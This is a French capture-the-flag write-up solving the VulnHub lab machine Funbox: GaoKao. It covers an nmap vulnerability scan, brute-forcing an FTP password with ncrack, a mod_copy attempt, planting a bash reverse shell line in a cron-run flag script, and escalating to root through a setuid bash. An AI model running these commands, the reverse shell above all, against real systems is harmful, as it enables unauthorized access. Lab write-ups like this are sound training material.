---
title: Solution du CTF Funbox GaoKao de VulnHub
tags: [CTF, VulnHub]
---

### DIDNTREADLOL

[Funbox: GaoKao](https://vulnhub.com/entry/funbox-gaokao,707/) est un CTF assez simple, il convient toutefois d'être attentif, ce qui par chance a été mon cas.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.129
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.129
Host is up (0.000067s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| vulners: 
|   cpe:/a:proftpd:proftpd:1.3.5e: 
|       SAINT:FD1752E124A72FD3A26EEB9B315E8382  10.0    https://vulners.com/saint/SAINT:FD1752E124A72FD3A26EEB9B315E8382        *EXPLOIT*
|       SAINT:950EB68D408A40399926A4CCAD3CC62E  10.0    https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E        *EXPLOIT*
|       SAINT:63FB77B9136D48259E4F0D4CDA35E957  10.0    https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957        *EXPLOIT*
|       SAINT:1B08F4664C428B180EEC9617B41D9A2C  10.0    https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C        *EXPLOIT*
|       PROFTPD_MOD_COPY        10.0    https://vulners.com/canvas/PROFTPD_MOD_COPY     *EXPLOIT*
--- snip ---
|       SSV:61050       5.0     https://vulners.com/seebug/SSV:61050    *EXPLOIT*
|_      CVE-2013-4359   5.0     https://vulners.com/cve/CVE-2013-4359
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
--- snip ---
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
|       HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6  9.8     https://vulners.com/httpd/HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
--- snip ---
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
MAC Address: 08:00:27:7C:BB:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.67 seconds
```

N'ayant rien trouvé sur le serveur web, je me suis orienté vers le FTP.

Comme `Nmap` nous indique que le serveur est vulnérable à la faille `mod_copy`, j'en ai profité pour tester :

```console
$ ncat 192.168.56.129 21 -v
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.129:21.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.56.129]
site cpfr /etc/passwd
530 Please login with USER and PASS
USER anonymous
331 Anonymous login ok, send your complete email address as your password
PASS a@a
230-Welcome, archive user anonymous@192.168.56.1 !
230-
230-The local time is: Thu Jul 03 11:43:43 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <sky@funbox9>.
230-
230 Anonymous access granted, restrictions apply
site cpfr /etc/passwd
550 /etc/passwd: No such file or directory
```

Ça n'a pas fonctionné, MAIS on a trouvé un nom d'utilisateur : `sky`.

```console
$ ncrack -u sky -P wordlists/Top1575-probable-v2.txt ftp://192.168.56.129

Starting Ncrack 0.8 ( http://ncrack.org )

Discovered credentials for ftp on 192.168.56.129 21/tcp:
192.168.56.129 21/tcp ftp: 'sky' 'thebest'

Ncrack done: 1 service scanned in 146.98 seconds.

Ncrack finished.
```

Toujours pas d'accès SSH, mais le FTP l'accepte :

```console
$ ftp sky@192.168.56.129
Connected to 192.168.56.129.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.56.129]
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||38354|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp> cd /home
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||13933|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 lucy     lucy         4096 Jun  6  2021 lucy
dr-xr-xr-x   4 sarah    sarah        4096 Jun  6  2021 sarah
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 sky
226 Transfer complete
```

J'ai essayé de brute-forcer le mot de passe de ces deux utilisatrices, sans succès.

Au moins on a le premier flag :

```bash
!/bin/sh
echo "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"
```

J'ai retenté la faille `mod_copy` avec l'utilisateur, et c'est mieux ! Mais de là à en faire quelque chose, non.

```console
$ ftp sky@192.168.56.129
Connected to 192.168.56.129.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.56.129]
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> site cpto /var/www/html/yolo.txt
550 cpto: Permission denied
```

Ensuite, l'utilisateur `sky` a un dossier `.ssh` dans son répertoire personnel. Le dossier appartient à `root`, mais grâce à une particularité des permissions Linux, je peux renommer ce dossier (car je possède le dossier parent) et créer un autre dossier `.ssh` à la place dans l'idée d'y placer un `authorized_keys`.

J'étais assez confiant mais...

```console
$ ssh -i ~/.ssh/key_no_pass sky@192.168.56.129
sky@192.168.56.129's password:
```

### GaoKao KO

Je suis finalement revenu à ce flag... Le fait que ce soit un script bash était trop louche. Je l'ai donc téléchargé, modifié pour ajouter cette commande, puis renvoyé :

```bash
bash -i >& /dev/tcp/192.168.56.1/80 0>&1
```

Finalement, j'avais une touche, et pas avec l'utilisateur attendu :

```console
$ sudo ncat -l -p 80 -v
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.56.129:46982.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ ls
ls
bash-4.4$ pwd
pwd
/home/sarah
bash-4.4$ id
id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)
```

Je me suis concentré manuellement sur les autres utilisateurs, processus, services avant de finalement lancer `LinPEAS` :

```console
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

`bash` en setuid root, jolie backdoor :)

```console
bash-4.4$ bash -p
bash-4.4# id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)
bash-4.4# cd /root
bash-4.4# ls -al
total 28
drwx------  4 root root 4096 Jun  6  2021 .
drwxr-xr-x 24 root root 4096 Jun  5  2021 ..
-rw-------  1 root root    0 Jun  6  2021 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun  5  2021 .ssh
drwxr-xr-x  2 root root 4096 Jun  5  2021 .vim
-rw-------  1 root root    0 Jun  6  2021 .viminfo
-rw-r--r--  1 root root 2289 Jun  5  2021 root.flag
bash-4.4# cat root.flag


  █████▒█    ██  ███▄    █  ▄▄▄▄    ▒█████  ▒██   ██▒     ▄████  ▄▄▄       ▒█████   ██ ▄█▀▄▄▄       ▒█████  
▓██   ▒ ██  ▓██▒ ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░    ██▒ ▀█▒▒████▄    ▒██▒  ██▒ ██▄█▒▒████▄    ▒██▒  ██▒
▒████ ░▓██  ▒██░▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒░░  █   ░   ▒██░▄▄▄░▒██  ▀█▄  ▒██░  ██▒▓███▄░▒██  ▀█▄  ▒██░  ██▒
░▓█▒  ░▓▓█  ░██░▓██▒  ▐▌██▒▒██░█▀  ▒██   ██░ ░ █ █ ▒    ░▓█  ██▓░██▄▄▄▄██ ▒██   ██░▓██ █▄░██▄▄▄▄██ ▒██   ██░
░▒█░   ▒▒█████▓ ▒██░   ▓██░░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒   ░▒▓███▀▒ ▓█   ▓██▒░ ████▓▒░▒██▒ █▄▓█   ▓██▒░ ████▓▒░
 ▒ ░   ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░    ░▒   ▒  ▒▒   ▓▒█░░ ▒░▒░▒░ ▒ ▒▒ ▓▒▒▒   ▓▒█░░ ▒░▒░▒░ 
 ░     ░░▒░ ░ ░ ░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░     ░   ░   ▒   ▒▒ ░  ░ ▒ ▒░ ░ ░▒ ▒░ ▒   ▒▒ ░  ░ ▒ ▒░ 
 ░ ░    ░░░ ░ ░    ░   ░ ░  ░    ░ ░ ░ ░ ▒   ░    ░     ░ ░   ░   ░   ▒   ░ ░ ░ ▒  ░ ░░ ░  ░   ▒   ░ ░ ░ ▒  
          ░              ░  ░          ░ ░   ░    ░           ░       ░  ░    ░ ░  ░  ░        ░  ░    ░ ░  
                                 ░                                                                          

You did it ! 
THX for playing Funbox: GAOKAO !

I look forward to see this screenshot on twitter: @0815R2d2
```
